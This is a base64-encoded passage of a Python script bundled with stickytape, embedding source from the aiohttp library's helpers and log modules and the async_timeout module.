xyXG4gICAgICAgICAgICBzZWxmLl9jb250ZW50X2RpY3QgPSB7fVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX2NvbnRlbnRfdHlwZSwgc2VsZi5fY29udGVudF9kaWN0ID0gY2dpLnBhcnNlX2hlYWRlcihyYXcpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY29udGVudF90eXBlKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJUaGUgdmFsdWUgb2YgY29udGVudCBwYXJ0IGZvciBDb250ZW50LVR5cGUgSFRUUCBoZWFkZXIuIiIiXHJcbiAgICAgICAgcmF3ID0gc2VsZi5faGVhZGVycy5nZXQoaGRycy5DT05URU5UX1RZUEUpICAjIHR5cGU6IGlnbm9yZVthdHRyLWRlZmluZWRdXHJcbiAgICAgICAgaWYgc2VsZi5fc3RvcmVkX2NvbnRlbnRfdHlwZSAhPSByYXc6XHJcbiAgICAgICAgICAgIHNlbGYuX3BhcnNlX2NvbnRlbnRfdHlwZShyYXcpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2NvbnRlbnRfdHlwZSAgIyB0eXBlOiBpZ25vcmVbcmV0dXJuLXZhbHVlXVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNoYXJzZXQoc2VsZikgLT4gT3B0aW9uYWxbc3RyXTpcclxuICAgICAgICAiIiJUaGUgdmFsdWUgb2YgY2hhcnNldCBwYXJ0IGZvciBDb250ZW50LVR5cGUgSFRUUCBoZWFkZXIuIiIiXHJcbiAgICAgICAgcmF3ID0gc2VsZi5faGVhZGVycy5nZXQoaGRycy5DT05URU5UX1RZUEUpICAjIHR5cGU6IGlnbm9yZVthdHRyLWRlZmluZWRdXHJcbiAgICAgICAgaWYgc2VsZi5fc3RvcmVkX2NvbnRlbnRfdHlwZSAhPSByYXc6XHJcbiAgICAgICAgICAgIHNlbGYuX3BhcnNlX2NvbnRlbnRfdHlwZShyYXcpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2NvbnRlbnRfZGljdC5nZXQoImNoYXJzZXQiKSAgIyB0eXBlOiBpZ25vcmVbdW5pb24tYXR0cl1cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjb250ZW50X2xlbmd0aChzZWxmKSAtPiBPcHRpb25hbFtpbnRdOlxyXG4gICAgICAgICIiIlRoZSB2YWx1ZSBvZiBDb250ZW50LUxlbmd0aCBIVFRQIGhlYWRlci4iIiJcclxuICAgICAgICBjb250ZW50X2xlbmd0aCA9IHNlbGYuX2hlYWRlcnMuZ2V0KCAgIyB0eXBlOiBpZ25vcmVbYXR0ci1kZWZpbmVkXVxyXG4gICAgICAgICAgICBoZHJzLkNPTlRFTlRfTEVOR1RIXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBjb250ZW50X2xlbmd0aCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuIGludChjb250ZW50X2xlbmd0aClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuXHJcbmRlZiBzZXRfcmVzdWx0KGZ1dDogImFzeW5jaW8uRnV0dXJlW19UXSIsIHJlc3VsdDogX1QpIC0+IE5vbmU6XHJcbiAgICBpZiBub3QgZnV0LmRvbmUoKTpcclxuICAgICAgICBmdXQuc2V0X3Jlc3VsdChyZXN1bHQpXHJcblxyXG5cclxuZGVmIHNldF9leGNlcHRpb24oZnV0OiAiYXN5bmNpby5GdXR1cmVbX1RdIiwgZXhjOiBCYXNlRXhjZXB0aW9uKSAtPiBOb25lOlxyXG4gICAgaWYgbm90IGZ1dC5kb25lKCk6XHJcbiAgICAgICAgZnV0LnNldF9leGNlcHRpb24oZXhjKVxyXG5cclxuXHJcbmNsYXNzIENoYWluTWFwUHJveHkoTWFwcGluZ1tzdHIsIEFueV0pOlxyXG4gICAgX19zbG90c19fID0gKCJfbWFwcyIsKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBtYXBzOiBJdGVyYWJsZVtNYXBwaW5nW3N0ciwgQW55XV0pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fbWFwcyA9IHR1cGxlKG1hcHMpXHJcblxyXG4gICAgZGVmIF9faW5pdF9zdWJjbGFzc19fKGNscykgLT4gTm9uZTpcclxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICJJbmhlcml0YW5jZSBjbGFzcyB7fSBmcm9tIENoYWluTWFwUHJveHkgIlxyXG4gICAgICAgICAgICAiaXMgZm9yYmlkZGVuIi5mb3JtYXQoY2xzLl9fbmFtZV9fKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwga2V5OiBzdHIpIC0+IEFueTpcclxuICAgICAgICBmb3IgbWFwcGluZyBpbiBzZWxmLl9tYXBzOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gbWFwcGluZ1trZXldXHJcbiAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjpcclxuICAgICAgICAgICAgICAgIHBhc3NcclxuICAgICAgICByYWlzZSBLZXlFcnJvcihrZXkpXHJcblxyXG4gICAgZGVmIGdldChzZWxmLCBrZXk6IHN0ciwgZGVmYXVsdDogQW55ID0gTm9uZSkgLT4gQW55OlxyXG4gICAgICAgIHJldHVybiBzZWxmW2tleV0gaWYga2V5IGluIHNlbGYgZWxzZSBkZWZhdWx0XHJcblxyXG4gICAgZGVmIF9fbGVuX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgICMgcmV1c2VzIHN0b3JlZCBoYXNoIHZhbHVlcyBpZiBwb3NzaWJsZVxyXG4gICAgICAgIHJldHVybiBsZW4oc2V0KCkudW5pb24oKnNlbGYuX21hcHMpKSAgIyB0eXBlOiBpZ25vcmVbYXJnLXR5cGVdXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW3N0cl06XHJcbiAgICAgICAgZCA9IHt9ICAjIHR5cGU6IERpY3Rbc3RyLCBBbnldXHJcbiAgICAgICAgZm9yIG1hcHBpbmcgaW4gcmV2ZXJzZWQoc2VsZi5fbWFwcyk6XHJcbiAgICAgICAgICAgICMgcmV1c2VzIHN0b3JlZCBoYXNoIHZhbHVlcyBpZiBwb3NzaWJsZVxyXG4gICAgICAgICAgICBkLnVwZGF0ZShtYXBwaW5nKVxyXG4gICAgICAgIHJldHVybiBpdGVyKGQpXHJcblxyXG4gICAgZGVmIF9fY29udGFpbnNfXyhzZWxmLCBrZXk6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gYW55KGtleSBpbiBtIGZvciBtIGluIHNlbGYuX21hcHMpXHJcblxyXG4gICAgZGVmIF9fYm9vbF9fKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIGFueShzZWxmLl9tYXBzKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgY29udGVudCA9ICIsICIuam9pbihtYXAocmVwciwgc2VsZi5fbWFwcykpXHJcbiAgICAgICAgcmV0dXJuIGYiQ2hhaW5NYXBQcm94eSh7Y29udGVudH0pIlxyXG5cclxuXHJcbiMgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzIjc2VjdGlvbi0yLjNcclxuX0VUQUdDID0gciJbISMtfVxceDgwLVxceGZmXSsiXHJcbl9FVEFHQ19SRSA9IHJlLmNvbXBpbGUoX0VUQUdDKVxyXG5fUVVPVEVEX0VUQUcgPSBmclwnKFcvKT8iKHtfRVRBR0N9KSJcJ1xyXG5RVU9URURfRVRBR19SRSA9IHJlLmNvbXBpbGUoX1FVT1RFRF9FVEFHKVxyXG5MSVNUX1FVT1RFRF9FVEFHX1JFID0gcmUuY29tcGlsZShmciIoe19RVU9URURfRVRBR30pKD86XFxzKixcXHMqfCQpfCguKSIpXHJcblxyXG5FVEFHX0FOWSA9ICIqIlxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBFVGFnOlxyXG4gICAgdmFsdWU6IHN0clxyXG4gICAgaXNfd2VhazogYm9vbCA9IEZhbHNlXHJcblxyXG5cclxuZGVmIHZhbGlkYXRlX2V0YWdfdmFsdWUodmFsdWU6IHN0cikgLT4gTm9uZTpcclxuICAgIGlmIHZhbHVlICE9IEVUQUdfQU5ZIGFuZCBub3QgX0VUQUdDX1JFLmZ1bGxtYXRjaCh2YWx1ZSk6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgZiJWYWx1ZSB7dmFsdWUhcn0gaXMgbm90IGEgdmFsaWQgZXRhZy4gTWF5YmUgaXQgY29udGFpbnMgXCdcXCJcJz8iXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmRlZiBwYXJzZV9odHRwX2RhdGUoZGF0ZV9zdHI6IE9wdGlvbmFsW3N0cl0pIC0+IE9wdGlvbmFsW2RhdGV0aW1lLmRhdGV0aW1lXTpcclxuICAgICIiIlByb2Nlc3MgYSBkYXRlIHN0cmluZywgcmV0dXJuIGEgZGF0ZXRpbWUgb2JqZWN0IiIiXHJcbiAgICBpZiBkYXRlX3N0ciBpcyBub3QgTm9uZTpcclxuICAgICAgICB0aW1ldHVwbGUgPSBwYXJzZWRhdGUoZGF0ZV9zdHIpXHJcbiAgICAgICAgaWYgdGltZXR1cGxlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICB3aXRoIHN1cHByZXNzKFZhbHVlRXJyb3IpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRhdGV0aW1lLmRhdGV0aW1lKCp0aW1ldHVwbGVbOjZdLCB0emluZm89ZGF0ZXRpbWUudGltZXpvbmUudXRjKVxyXG4gICAgcmV0dXJuIE5vbmVcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2FzeW5jX3RpbWVvdXQvX19pbml0X18ucHknLCBiJ2ltcG9ydCBhc3luY2lvXG5pbXBvcnQgZW51bVxuaW1wb3J0IHN5c1xuaW1wb3J0IHdhcm5pbmdzXG5mcm9tIHR5cGVzIGltcG9ydCBUcmFjZWJhY2tUeXBlXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBPcHRpb25hbCwgVHlwZVxuXG5cbmlmIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDgpOlxuICAgIGZyb20gdHlwaW5nIGltcG9ydCBmaW5hbFxuZWxzZTpcbiAgICBmcm9tIHR5cGluZ19leHRlbnNpb25zIGltcG9ydCBmaW5hbFxuXG5cbl9fdmVyc2lvbl9fID0gIjQuMC4yIlxuXG5cbl9fYWxsX18gPSAoInRpbWVvdXQiLCAidGltZW91dF9hdCIsICJUaW1lb3V0IilcblxuXG5kZWYgdGltZW91dChkZWxheTogT3B0aW9uYWxbZmxvYXRdKSAtPiAiVGltZW91dCI6XG4gICAgIiIidGltZW91dCBjb250ZXh0IG1hbmFnZXIuXG5cbiAgICBVc2VmdWwgaW4gY2FzZXMgd2hlbiB5b3Ugd2FudCB0byBhcHBseSB0aW1lb3V0IGxvZ2ljIGFyb3VuZCBibG9ja1xuICAgIG9mIGNvZGUgb3IgaW4gY2FzZXMgd2hlbiBhc3luY2lvLndhaXRfZm9yIGlzIG5vdCBzdWl0YWJsZS4gRm9yIGV4YW1wbGU6XG5cbiAgICA+Pj4gYXN5bmMgd2l0aCB0aW1lb3V0KDAuMDAxKTpcbiAgICAuLi4gICAgIGFzeW5jIHdpdGggYWlvaHR0cC5nZXQoXCdodHRwczovL2dpdGh1Yi5jb21cJykgYXMgcjpcbiAgICAuLi4gICAgICAgICBhd2FpdCByLnRleHQoKVxuXG5cbiAgICBkZWxheSAtIHZhbHVlIGluIHNlY29uZHMgb3IgTm9uZSB0byBkaXNhYmxlIHRpbWVvdXQgbG9naWNcbiAgICAiIiJcbiAgICBsb29wID0gX2dldF9ydW5uaW5nX2xvb3AoKVxuICAgIGlmIGRlbGF5IGlzIG5vdCBOb25lOlxuICAgICAgICBkZWFkbGluZSA9IGxvb3AudGltZSgpICsgZGVsYXkgICMgdHlwZTogT3B0aW9uYWxbZmxvYXRdXG4gICAgZWxzZTpcbiAgICAgICAgZGVhZGxpbmUgPSBOb25lXG4gICAgcmV0dXJuIFRpbWVvdXQoZGVhZGxpbmUsIGxvb3ApXG5cblxuZGVmIHRpbWVvdXRfYXQoZGVhZGxpbmU6IE9wdGlvbmFsW2Zsb2F0XSkgLT4gIlRpbWVvdXQiOlxuICAgICIiIlNjaGVkdWxlIHRoZSB0aW1lb3V0IGF0IGFic29sdXRlIHRpbWUuXG5cbiAgICBkZWFkbGluZSBhcmd1bWVudCBwb2ludHMgb24gdGhlIHRpbWUgaW4gdGhlIHNhbWUgY2xvY2sgc3lzdGVtXG4gICAgYXMgbG9vcC50aW1lKCkuXG5cbiAgICBQbGVhc2Ugbm90ZTogaXQgaXMgbm90IFBPU0lYIHRpbWUgYnV0IGEgdGltZSB3aXRoXG4gICAgdW5kZWZpbmVkIHN0YXJ0aW5nIGJhc2UsIGUuZy4gdGhlIHRpbWUgb2YgdGhlIHN5c3RlbSBwb3dlciBvbi5cblxuICAgID4+PiBhc3luYyB3aXRoIHRpbWVvdXRfYXQobG9vcC50aW1lKCkgKyAxMCk6XG4gICAgLi4uICAgICBhc3luYyB3aXRoIGFpb2h0dHAuZ2V0KFwnaHR0cHM6Ly9naXRodWIuY29tXCcpIGFzIHI6XG4gICAgLi4uICAgICAgICAgYXdhaXQgci50ZXh0KClcblxuXG4gICAgIiIiXG4gICAgbG9vcCA9IF9nZXRfcnVubmluZ19sb29wKClcbiAgICByZXR1cm4gVGltZW91dChkZWFkbGluZSwgbG9vcClcblxuXG5jbGFzcyBfU3RhdGUoZW51bS5FbnVtKTpcbiAgICBJTklUID0gIklOSVQiXG4gICAgRU5URVIgPSAiRU5URVIiXG4gICAgVElNRU9VVCA9ICJUSU1FT1VUIlxuICAgIEVYSVQgPSAiRVhJVCJcblxuXG5AZmluYWxcbmNsYXNzIFRpbWVvdXQ6XG4gICAgIyBJbnRlcm5hbCBjbGFzcywgcGxlYXNlIGRvblwndCBpbnN0YW50aWF0ZSBpdCBkaXJlY3RseVxuICAgICMgVXNlIHRpbWVvdXQoKSBhbmQgdGltZW91dF9hdCgpIHB1YmxpYyBmYWN0b3JpZXMgaW5zdGVhZC5cbiAgICAjXG4gICAgIyBJbXBsZW1lbnRhdGlvbiBub3RlOiBgYXN5bmMgd2l0aCB0aW1lb3V0KClgIGlzIHByZWZlcnJlZFxuICAgICMgb3ZlciBgd2l0aCB0aW1lb3V0KClgLlxuICAgICMgV2hpbGUgdGVjaG5pY2FsbHkgdGhlIFRpbWVvdXQgY2xhc3MgaW1wbGVtZW50YXRpb25cbiAgICAjIGRvZXNuXCd0IG5lZWQgdG8gYmUgYXN5bmMgYXQgYWxsLFxuICAgICMgdGhlIGBhc3luYyB3aXRoYCBzdGF0ZW1lbnQgZXhwbGljaXRseSBwb2ludHMgdGhhdFxuICAgICMgdGhlIGNvbnRleHQgbWFuYWdlciBzaG91bGQgYmUgdXNlZCBmcm9tIGFzeW5jIGZ1bmN0aW9uIGNvbnRleHQuXG4gICAgI1xuICAgICMgVGhpcyBkZXNpZ24gYWxsb3dzIHRvIGF2b2lkIG1hbnkgc2lsbHkgbWlzdXNhZ2VzLlxuICAgICNcbiAgICAjIFRpbWVvdXRFcnJvciBpcyByYWlzZWQgaW1tYWRpYXRlbGx5IHdoZW4gc2NoZWR1bGVkXG4gICAgIyBpZiB0aGUgZGVhZGxpbmUgaXMgcGFzc2VkLlxuICAgICMgVGhlIHB1cnBvc2UgaXMgdG8gdGltZSBvdXQgYXMgc3NvbiBhcyBwb3NzaWJsZVxuICAgICMgd2l0aG91dCB3YWl0aW5nIGZvciB0aGUgbmV4dCBhd2FpdCBleHByZXNzaW9uLlxuXG4gICAgX19zbG90c19fID0gKCJfZGVhZGxpbmUiLCAiX2xvb3AiLCAiX3N0YXRlIiwgIl90aW1lb3V0X2hhbmRsZXIiKVxuXG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLCBkZWFkbGluZTogT3B0aW9uYWxbZmxvYXRdLCBsb29wOiBhc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXG4gICAgKSAtPiBOb25lOlxuICAgICAgICBzZWxmLl9sb29wID0gbG9vcFxuICAgICAgICBzZWxmLl9zdGF0ZSA9IF9TdGF0ZS5JTklUXG5cbiAgICAgICAgc2VsZi5fdGltZW91dF9oYW5kbGVyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLkhhbmRsZV1cbiAgICAgICAgaWYgZGVhZGxpbmUgaXMgTm9uZTpcbiAgICAgICAgICAgIHNlbGYuX2RlYWRsaW5lID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtmbG9hdF1cbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHNlbGYudXBkYXRlKGRlYWRsaW5lKVxuXG4gICAgZGVmIF9fZW50ZXJfXyhzZWxmKSAtPiAiVGltZW91dCI6XG4gICAgICAgIHdhcm5pbmdzLndhcm4oXG4gICAgICAgICAgICAid2l0aCB0aW1lb3V0KCkgaXMgZGVwcmVjYXRlZCwgdXNlIGFzeW5jIHdpdGggdGltZW91dCgpIGluc3RlYWQiLFxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxuICAgICAgICApXG4gICAgICAgIHNlbGYuX2RvX2VudGVyKClcbiAgICAgICAgcmV0dXJuIHNlbGZcblxuICAgIGRlZiBfX2V4aXRfXyhcbiAgICAgICAgc2VsZixcbiAgICAgICAgZXhjX3R5cGU6IE9wdGlvbmFsW1R5cGVbQmFzZUV4Y2VwdGlvbl1dLFxuICAgICAgICBleGNfdmFsOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXSxcbiAgICAgICAgZXhjX3RiOiBPcHRpb25hbFtUcmFjZWJhY2tUeXBlXSxcbiAgICApIC0+IE9wdGlvbmFsW2Jvb2xdOlxuICAgICAgICBzZWxmLl9kb19leGl0KGV4Y190eXBlKVxuICAgICAgICByZXR1cm4gTm9uZVxuXG4gICAgYXN5bmMgZGVmIF9fYWVudGVyX18oc2VsZikgLT4gIlRpbWVvdXQiOlxuICAgICAgICBzZWxmLl9kb19lbnRlcigpXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBhc3luYyBkZWYgX19hZXhpdF9fKFxuICAgICAgICBzZWxmLFxuICAgICAgICBleGNfdHlwZTogT3B0aW9uYWxbVHlwZVtCYXNlRXhjZXB0aW9uXV0sXG4gICAgICAgIGV4Y192YWw6IE9wdGlvbmFsW0Jhc2VFeGNlcHRpb25dLFxuICAgICAgICBleGNfdGI6IE9wdGlvbmFsW1RyYWNlYmFja1R5cGVdLFxuICAgICkgLT4gT3B0aW9uYWxbYm9vbF06XG4gICAgICAgIHNlbGYuX2RvX2V4aXQoZXhjX3R5cGUpXG4gICAgICAgIHJldHVybiBOb25lXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgZXhwaXJlZChzZWxmKSAtPiBib29sOlxuICAgICAgICAiIiJJcyB0aW1lb3V0IGV4cGlyZWQgZHVyaW5nIGV4ZWN1dGlvbj8iIiJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3N0YXRlID09IF9TdGF0ZS5USU1FT1VUXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgZGVhZGxpbmUoc2VsZikgLT4gT3B0aW9uYWxbZmxvYXRdOlxuICAgICAgICByZXR1cm4gc2VsZi5fZGVhZGxpbmVcblxuICAgIGRlZiByZWplY3Qoc2VsZikgLT4gTm9uZTpcbiAgICAgICAgIiIiUmVqZWN0IHNjaGVkdWxlZCB0aW1lb3V0IGlmIGFueS4iIiJcbiAgICAgICAgIyBjYW5jZWwgaXMgbWF5YmUgYmV0dGVyIG5hbWUgYnV0XG4gICAgICAgICMgdGFzay5jYW5jZWwoKSByYWlzZXMgQ2FuY2VsbGVkRXJyb3IgaW4gYXN5bmNpbyB3b3JsZC5cbiAgICAgICAgaWYgc2VsZi5fc3RhdGUgbm90IGluIChfU3RhdGUuSU5JVCwgX1N0YXRlLkVOVEVSKTpcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihmImludmFsaWQgc3RhdGUge3NlbGYuX3N0YXRlLnZhbHVlfSIpXG4gICAgICAgIHNlbGYuX3JlamVjdCgpXG5cbiAgICBkZWYgX3JlamVjdChzZWxmKSAtPiBOb25lOlxuICAgICAgICBpZiBzZWxmLl90aW1lb3V0X2hhbmRsZXIgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICBzZWxmLl90aW1lb3V0X2hhbmRsZXIuY2FuY2VsKClcbiAgICAgICAgICAgIHNlbGYuX3RpbWVvdXRfaGFuZGxlciA9IE5vbmVcblxuICAgIGRlZiBzaGlmdChzZWxmLCBkZWxheTogZmxvYXQpIC0+IE5vbmU6XG4gICAgICAgICIiIkFkdmFuY2UgdGltZW91dCBvbiBkZWxheSBzZWNvbmRzLlxuXG4gICAgICAgIFRoZSBkZWxheSBjYW4gYmUgbmVnYXRpdmUuXG5cbiAgICAgICAgUmFpc2UgUnVudGltZUVycm9yIGlmIHNoaWZ0IGlzIGNhbGxlZCB3aGVuIGRlYWRsaW5lIGlzIG5vdCBzY2hlZHVsZWRcbiAgICAgICAgIiIiXG4gICAgICAgIGRlYWRsaW5lID0gc2VsZi5fZGVhZGxpbmVcbiAgICAgICAgaWYgZGVhZGxpbmUgaXMgTm9uZTpcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiY2Fubm90IHNoaWZ0IHRpbWVvdXQgaWYgZGVhZGxpbmUgaXMgbm90IHNjaGVkdWxlZCIpXG4gICAgICAgIHNlbGYudXBkYXRlKGRlYWRsaW5lICsgZGVsYXkpXG5cbiAgICBkZWYgdXBkYXRlKHNlbGYsIGRlYWRsaW5lOiBmbG9hdCkgLT4gTm9uZTpcbiAgICAgICAgIiIiU2V0IGRlYWRsaW5lIHRvIGFic29sdXRlIHZhbHVlLlxuXG4gICAgICAgIGRlYWRsaW5lIGFyZ3VtZW50IHBvaW50cyBvbiB0aGUgdGltZSBpbiB0aGUgc2FtZSBjbG9jayBzeXN0ZW1cbiAgICAgICAgYXMgbG9vcC50aW1lKCkuXG5cbiAgICAgICAgSWYgbmV3IGRlYWRsaW5lIGlzIGluIHRoZSBwYXN0IHRoZSB0aW1lb3V0IGlzIHJhaXNlZCBpbW1lZGlhdGVsbHkuXG5cbiAgICAgICAgUGxlYXNlIG5vdGU6IGl0IGlzIG5vdCBQT1NJWCB0aW1lIGJ1dCBhIHRpbWUgd2l0aFxuICAgICAgICB1bmRlZmluZWQgc3RhcnRpbmcgYmFzZSwgZS5nLiB0aGUgdGltZSBvZiB0aGUgc3lzdGVtIHBvd2VyIG9uLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgc2VsZi5fc3RhdGUgPT0gX1N0YXRlLkVYSVQ6XG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoImNhbm5vdCByZXNjaGVkdWxlIGFmdGVyIGV4aXQgZnJvbSBjb250ZXh0IG1hbmFnZXIiKVxuICAgICAgICBpZiBzZWxmLl9zdGF0ZSA9PSBfU3RhdGUuVElNRU9VVDpcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiY2Fubm90IHJlc2NoZWR1bGUgZXhwaXJlZCB0aW1lb3V0IilcbiAgICAgICAgaWYgc2VsZi5fdGltZW91dF9oYW5kbGVyIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgc2VsZi5fdGltZW91dF9oYW5kbGVyLmNhbmNlbCgpXG4gICAgICAgIHNlbGYuX2RlYWRsaW5lID0gZGVhZGxpbmVcbiAgICAgICAgaWYgc2VsZi5fc3RhdGUgIT0gX1N0YXRlLklOSVQ6XG4gICAgICAgICAgICBzZWxmLl9yZXNjaGVkdWxlKClcblxuICAgIGRlZiBfcmVzY2hlZHVsZShzZWxmKSAtPiBOb25lOlxuICAgICAgICBhc3NlcnQgc2VsZi5fc3RhdGUgPT0gX1N0YXRlLkVOVEVSXG4gICAgICAgIGRlYWRsaW5lID0gc2VsZi5fZGVhZGxpbmVcbiAgICAgICAgaWYgZGVhZGxpbmUgaXMgTm9uZTpcbiAgICAgICAgICAgIHJldHVyblxuXG4gICAgICAgIG5vdyA9IHNlbGYuX2xvb3AudGltZSgpXG4gICAgICAgIGlmIHNlbGYuX3RpbWVvdXRfaGFuZGxlciBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHNlbGYuX3RpbWVvdXRfaGFuZGxlci5jYW5jZWwoKVxuXG4gICAgICAgIHRhc2sgPSBfY3VycmVudF90YXNrKHNlbGYuX2xvb3ApXG4gICAgICAgIGlmIGRlYWRsaW5lIDw9IG5vdzpcbiAgICAgICAgICAgIHNlbGYuX3RpbWVvdXRfaGFuZGxlciA9IHNlbGYuX2xvb3AuY2FsbF9zb29uKHNlbGYuX29uX3RpbWVvdXQsIHRhc2spXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBzZWxmLl90aW1lb3V0X2hhbmRsZXIgPSBzZWxmLl9sb29wLmNhbGxfYXQoZGVhZGxpbmUsIHNlbGYuX29uX3RpbWVvdXQsIHRhc2spXG5cbiAgICBkZWYgX2RvX2VudGVyKHNlbGYpIC0+IE5vbmU6XG4gICAgICAgIGlmIHNlbGYuX3N0YXRlICE9IF9TdGF0ZS5JTklUOlxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKGYiaW52YWxpZCBzdGF0ZSB7c2VsZi5fc3RhdGUudmFsdWV9IilcbiAgICAgICAgc2VsZi5fc3RhdGUgPSBfU3RhdGUuRU5URVJcbiAgICAgICAgc2VsZi5fcmVzY2hlZHVsZSgpXG5cbiAgICBkZWYgX2RvX2V4aXQoc2VsZiwgZXhjX3R5cGU6IE9wdGlvbmFsW1R5cGVbQmFzZUV4Y2VwdGlvbl1dKSAtPiBOb25lOlxuICAgICAgICBpZiBleGNfdHlwZSBpcyBhc3luY2lvLkNhbmNlbGxlZEVycm9yIGFuZCBzZWxmLl9zdGF0ZSA9PSBfU3RhdGUuVElNRU9VVDpcbiAgICAgICAgICAgIHNlbGYuX3RpbWVvdXRfaGFuZGxlciA9IE5vbmVcbiAgICAgICAgICAgIHJhaXNlIGFzeW5jaW8uVGltZW91dEVycm9yXG4gICAgICAgICMgdGltZW91dCBoYXMgbm90IGV4cGlyZWRcbiAgICAgICAgc2VsZi5fc3RhdGUgPSBfU3RhdGUuRVhJVFxuICAgICAgICBzZWxmLl9yZWplY3QoKVxuICAgICAgICByZXR1cm4gTm9uZVxuXG4gICAgZGVmIF9vbl90aW1lb3V0KHNlbGYsIHRhc2s6ICJhc3luY2lvLlRhc2tbTm9uZV0iKSAtPiBOb25lOlxuICAgICAgICB0YXNrLmNhbmNlbCgpXG4gICAgICAgIHNlbGYuX3N0YXRlID0gX1N0YXRlLlRJTUVPVVRcbiAgICAgICAgIyBkcm9wIHRoZSByZWZlcmVuY2UgZWFybHlcbiAgICAgICAgc2VsZi5fdGltZW91dF9oYW5kbGVyID0gTm9uZVxuXG5cbmlmIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDcpOlxuXG4gICAgZGVmIF9jdXJyZW50X3Rhc2sobG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCkgLT4gIk9wdGlvbmFsW2FzeW5jaW8uVGFza1tBbnldXSI6XG4gICAgICAgIHJldHVybiBhc3luY2lvLmN1cnJlbnRfdGFzayhsb29wPWxvb3ApXG5cbmVsc2U6XG5cbiAgICBkZWYgX2N1cnJlbnRfdGFzayhsb29wOiBhc3luY2lvLkFic3RyYWN0RXZlbnRMb29wKSAtPiAiT3B0aW9uYWxbYXN5bmNpby5UYXNrW0FueV1dIjpcbiAgICAgICAgcmV0dXJuIGFzeW5jaW8uVGFzay5jdXJyZW50X3Rhc2sobG9vcD1sb29wKVxuXG5cbmlmIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDcpOlxuXG4gICAgZGVmIF9nZXRfcnVubmluZ19sb29wKCkgLT4gYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcDpcbiAgICAgICAgcmV0dXJuIGFzeW5jaW8uZ2V0X3J1bm5pbmdfbG9vcCgpXG5cbmVsc2U6XG5cbiAgICBkZWYgX2dldF9ydW5uaW5nX2xvb3AoKSAtPiBhc3luY2lvLkFic3RyYWN0RXZlbnRMb29wOlxuICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXG4gICAgICAgIGlmIG5vdCBsb29wLmlzX3J1bm5pbmcoKTpcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigibm8gcnVubmluZyBldmVudCBsb29wIilcbiAgICAgICAgcmV0dXJuIGxvb3BcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2xvZy5weScsIGInaW1wb3J0IGxvZ2dpbmdcclxuXHJcbmFjY2Vzc19sb2dnZXIgPSBsb2dnaW5nLmdldExvZ2dlcigiYWlvaHR0cC5hY2Nlc3MiKVxyXG